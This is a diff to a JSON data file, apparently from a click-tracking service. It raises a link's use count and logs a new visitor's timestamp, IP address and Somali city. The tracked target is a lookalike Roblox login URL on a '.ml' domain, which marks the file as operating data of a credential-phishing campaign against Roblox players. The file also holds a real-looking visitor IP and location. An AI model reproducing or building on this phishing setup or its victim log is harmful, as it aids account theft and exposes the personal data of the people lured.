@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 355,
+    "useCount": 356,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2952,6 +2952,14 @@
         "city": "Cape Town",
         "flag": "🇿🇦",
         "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777034798061,
+        "ip": "102.223.191.167",
+        "country": "Somalia",
+        "city": "Garoowe",
+        "flag": "🇸🇴",
+        "countryCode": "SO"
       }
     ]
   },
